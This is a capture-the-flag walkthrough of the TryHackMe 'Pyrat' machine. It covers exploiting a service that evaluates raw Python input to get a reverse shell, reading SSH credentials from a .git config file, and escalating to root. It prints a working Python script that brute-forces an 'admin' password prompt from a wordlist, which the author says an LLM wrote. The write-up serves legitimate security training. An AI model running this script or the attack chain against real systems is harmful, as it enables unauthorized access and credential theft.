![[Pasted image 20250810193916.png]]
## Description:
Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.

### Target IP: 10.201.88.90

### Reconnaissance
Nmap Scan Result:
```
┌──(nightcrypt㉿kali)-[~/Documents/Tryhackme/THM_Machines/Pyrat]
└─$ nmap -sC -sV 10.201.88.90       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 16:45 PST
Nmap scan report for 10.201.88.90 (10.201.88.90)
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:2f:91:03:ba:80:49:38:c3:49:78:ed:db:c2:8a:5a (RSA)
|   256 d2:c8:ce:22:d7:74:bb:52:42:6c:ce:95:a3:d3:60:90 (ECDSA)
|_  256 e3:c9:39:b2:6c:05:1c:d4:d1:70:f0:58:c2:6a:73:39 (ED25519)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions: 
|     invalid syntax (<string>, line 1)
|   GetRequest: 
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     name 'OPTIONS' is not defined
|   Help: 
|_    name 'HELP' is not defined
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.95%I=7%D=8/10%Time=68985C2E%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1,"\n")%r(GetRequest,1A,"name\x20'GET'\x20is\x20not\x20defin
SF:ed\n")%r(X11Probe,2D,"source\x20code\x20string\x20cannot\x20contain\x20
SF:null\x20bytes\n")%r(FourOhFourRequest,22,"invalid\x20syntax\x20\(<strin
SF:g>,\x20line\x201\)\n")%r(Socks4,2D,"source\x20code\x20string\x20cannot\
SF:x20contain\x20null\x20bytes\n")%r(HTTPOptions,1E,"name\x20'OPTIONS'\x20
SF:is\x20not\x20defined\n")%r(RTSPRequest,1E,"name\x20'OPTIONS'\x20is\x20n
SF:ot\x20defined\n")%r(DNSVersionBindReqTCP,2D,"source\x20code\x20string\x
SF:20cannot\x20contain\x20null\x20bytes\n")%r(DNSStatusRequestTCP,2D,"sour
SF:ce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Help,1
SF:B,"name\x20'HELP'\x20is\x20not\x20defined\n")%r(LPDString,22,"invalid\x
SF:20syntax\x20\(<string>,\x20line\x201\)\n")%r(SIPOptions,22,"invalid\x20
SF:syntax\x20\(<string>,\x20line\x201\)\n")%r(LANDesk-RC,2D,"source\x20cod
SF:e\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(NotesRPC,2D,"so
SF:urce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Java
SF:RMI,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\
SF:n")%r(afp,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20
SF:bytes\n")%r(giop,2D,"source\x20code\x20string\x20cannot\x20contain\x20n
SF:ull\x20bytes\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.58 seconds
```

I typed the IP and port number on the site to check if we could find anything but it returns 'Try a more basic connection' as shown in the image below:
![[2025-08-10_19-41.png]]



### Initial Foothold:

With this, I tried connecting via Netcat:
```
nc 10.201.88.90 8000
```

I typed '_GET / HTTP/1.1_' but it returns: 
```
name 'GET' is not defined
```
This is not a normal HTTP response.

The server is likely running a python code so I tried typing this:
```
print(1+1)
2
```

As seen above, it returned '2' as a response. Therefore, our theory was validated that it is running a python code. Using this information, we could run a payload to create a connection.

I used Payload playground to create a python reverse shell using this link: https://payloadplayground.com/generators/reverse-shell. I only copied the command inside the single quote.
![[2025-08-10_19-55.png]]
I setup the netcat listener on port 4444 first then pasted the generated payload in the nc connection that we established earlier:
![[2025-08-10_19-59.png]]

Press enter and we would see the connection in our nc listener:
![[2025-08-10_20-02.png]]

After a lot of manual enumeration, I stumbled upon the /opt/dev/.git directory where you'll see a config file:
![[2025-08-10_20-05.png]]

Check the file and you'll get the Credentials to login via ssh.
![[2025-08-10_20-08.png]]

### User flag
After logging in, you'll see the user flag.
![[userflag.png]]


### Privilege Escalation
I checked the processes to look for possible privilege escalation vectors and there's a pyrat.py file that is running in the background using the root privileges.
![[2025-08-10_20-15.png]]

Since we saw this endpoint existed in the old version, we can fuzz for other endpoints. I initially typed 'admin' in our nc connection to check for a low hanging fruit and I just got lucky to get a valid endpoint.
![[2025-08-10_20-28.png]]


After this, I was prompt to enter a password so I asked the help of an LLM to write this **python script** to brute-force its password:

```python
import socket

# Configuration
target_ip = "10.201.88.90"  # Target IP
target_port = 8000         # Target port
password_wordlist = "/usr/share/seclists/Passwords/500-worst-passwords.txt"  # Path to your password wordlist file

def connect_and_send_password(password):
    try:
        # Create a socket connection
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))

        # Send 'admin' username first
        client_socket.sendall(b'admin\n')

        # Receive server's response
        response = client_socket.recv(1024).decode()

        if "Password:" in response:  # Check if server is asking for a password
            client_socket.sendall(password.encode() + b"\n")  # Send password

            # Receive server's response to the password
            response = client_socket.recv(1024).decode()

            # Show only if there is a valid hit or specific response
            if "success" in response.lower() or "welcome" in response.lower():  # Adjust based on actual success messages
                print(f"[+] Valid password found: {password}")
                return True
            
            # Optionally show any other significant responses
            if "invalid" in response.lower() or "incorrect" in response.lower():  # Adjust based on actual error messages
                print(f"[-] Response for password '{password}': {response}")

        return False

    except Exception as e:
        return False

    finally:
        client_socket.close()  # Always ensure the socket is closed

def fuzz_passwords():
    # Open the password wordlist file
    with open(password_wordlist, "r", encoding="utf-8", errors="ignore") as file:
        passwords = file.readlines()

    # Iterate through each password in the wordlist
    for password in passwords:
        password = password.strip()  # Remove any newline characters

        if connect_and_send_password(password):
            break  # Exit after finding the first valid password

if __name__ == "__main__":
    fuzz_passwords()
```

![[admin_password.png]]

We got a valid password! Now, we just got to enter it in our nc connection to gain a shell.

### Root flag

After a successful login, you just got to read the root flag.

![[rootflag.png]]


Happy Hacking!!!